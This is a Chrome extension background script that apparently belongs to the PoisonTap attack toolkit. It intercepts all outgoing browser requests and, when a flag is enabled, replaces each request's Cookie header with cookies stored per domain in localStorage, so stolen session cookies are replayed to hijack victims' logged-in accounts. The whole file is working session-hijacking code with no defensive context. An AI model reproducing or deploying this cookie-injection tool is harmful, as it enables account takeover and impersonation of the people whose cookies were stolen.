function url_domain(data) {
  var a = document.createElement('a');
  a.href = data;
  return a.hostname;
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    var i = 0;

    for (i = 0; i < details.requestHeaders.length; i++) {
      if (details.requestHeaders[i].name == "Cookie")
	break;
    }
    if (i == details.requestHeaders.length) {
      details.requestHeaders.push({"name": "Cookie", "value": ""});
    }

    if (localStorage.getItem("enable_poisontap_cookies") == "true") {
      if (localStorage.getItem("cookies")) {
	var cookiesList = JSON.parse(localStorage.getItem("cookies"));

	if (cookiesList[url_domain(details.url)]) {
	  console.log("Injecting Cookies for " + url_domain(details.url));
	  details.requestHeaders[i].value = cookiesList[url_domain(details.url)];
	}
      }
    }

    return {requestHeaders: details.requestHeaders};
  },
  {urls: ["<all_urls>"]},
  ["blocking", "requestHeaders"]
);
